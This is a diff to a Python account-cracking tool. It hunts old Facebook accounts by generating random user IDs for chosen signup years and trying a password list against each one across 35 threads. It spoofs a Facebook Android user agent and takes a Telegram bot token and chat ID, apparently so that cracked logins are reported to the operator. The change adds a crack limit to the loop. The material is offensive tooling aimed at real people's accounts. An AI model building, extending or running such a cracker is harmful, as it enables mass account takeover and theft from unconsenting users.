@@ -16,7 +16,7 @@ P = '\033[1;35m'
 C = '\033[1;36m' 
 W = '\033[1;37m' 
 
-hits, cp, bad = 0, 0, 0
+hits, cp, bad, loop = 0, 0, 0, 0
 stop_check = False
 
 def logo():
@@ -39,7 +39,7 @@ def join_channel():
     time.sleep(2)
 
 def login_fb(user, pw, chat_id, bot_token):
-    global hits, cp, bad, stop_check
+    global hits, cp, bad, stop_check, loop
     if stop_check: return
 
     ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
@@ -115,11 +115,13 @@ def tool_check_file():
     time.sleep(2)
 
 def tool_old_hunting():
-    global stop_check
+    global stop_check, loop
     stop_check = False
+    loop = 0
     logo()
     print(f"{C}[1] {W}2004-2005 {C}[2] {W}2009 {C}[3] {W}2010-2012 {C}[4] {W}2013-2014")
     year = input(f"\n{G}[+] Select Year: {P}")
+    limit = int(input(f"{G}[+] Crack Limit (IDs): {P}"))
     bot_token = input(f"{G}[+] Bot Token: {B}")
     chat_id = input(f"{G}[+] Chat ID: {B}")
     
@@ -127,7 +129,8 @@ def tool_old_hunting():
     
     print(f"{Y}[*] Hunting Started...")
     with ThreadPoolExecutor(max_workers=35) as pool:
-        while not stop_check:
+        while loop < limit:
+            if stop_check: break
             if year == '1': 
                 uid = str(random.randint(100000, 99000000))
             elif year == '2': 
@@ -137,8 +140,13 @@ def tool_old_hunting():
             elif year == '4': 
                 uid = "100005" + str(random.randint(100000000, 999999999))
             else: break
+            
             for pw in passwords: 
                 pool.submit(login_fb, uid, pw, chat_id, bot_token)
+            loop += 1
+            
+    print(f"\n{G}[+] Limit Reached. Finished!")
+    time.sleep(3)
 
 def main():
     join_channel()
